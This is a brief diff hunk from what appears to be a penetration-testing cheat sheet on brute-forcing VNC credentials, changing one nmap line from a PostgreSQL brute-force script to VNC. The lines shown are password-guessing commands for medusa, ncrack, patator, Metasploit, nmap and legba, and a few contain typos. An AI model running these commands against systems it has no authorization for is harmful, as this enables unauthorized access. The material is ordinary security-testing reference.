@@ -529,7 +529,7 @@ medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
 ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
 patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
 use auxiliary/scanner/vnc/vnc_login
-nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
+nmap -p 5900,5901 --script vnc-brute --script-args brute.credfile=wordlist.txt <IP>
 legba vnc --target localhost:5901 --password data/passwords.txt
 
 #Metasploit
